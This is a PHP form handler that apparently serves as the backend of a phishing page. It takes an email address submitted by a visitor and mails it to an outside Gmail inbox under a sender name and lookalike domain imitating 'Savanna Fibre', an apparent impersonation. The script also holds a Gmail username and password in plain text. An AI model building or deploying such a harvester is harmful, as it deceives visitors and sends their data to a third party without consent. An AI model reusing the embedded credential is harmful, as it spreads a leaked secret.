<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // PHPMailer's autoload file

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['email'])) {
    $userEmail = $_POST['email'];

    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->SMTPDebug = 0;                                   // Disable debug output
        $mail->isSMTP();                                        // Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                   // Set the SMTP server
        $mail->SMTPAuth   = true;                               // Enable SMTP authentication
        $mail->Username   = 'infosecotw@gmail.com';             // Your Gmail address
        $mail->Password   = '@Wanjohi031';                // Your app-specific Gmail password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;     // Enable TLS encryption
        $mail->Port       = 587;                                // TCP port for Gmail

        // Recipients
        $mail->setFrom('noreply@savannfire.com', 'Savanna Fibre');
        $mail->addAddress('infosecotw@gmail.com');              // Email address to send to

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'User Email Retrieved';
        $mail->Body    = 'The user email retrieved is: ' . htmlspecialchars($userEmail);

        $mail->send();
        echo 'Email has been sent!';
    } catch (Exception $e) {
        echo "Email could not be sent. Error: {$mail->ErrorInfo}";
    }
} else {
    echo "No email address provided.";
}
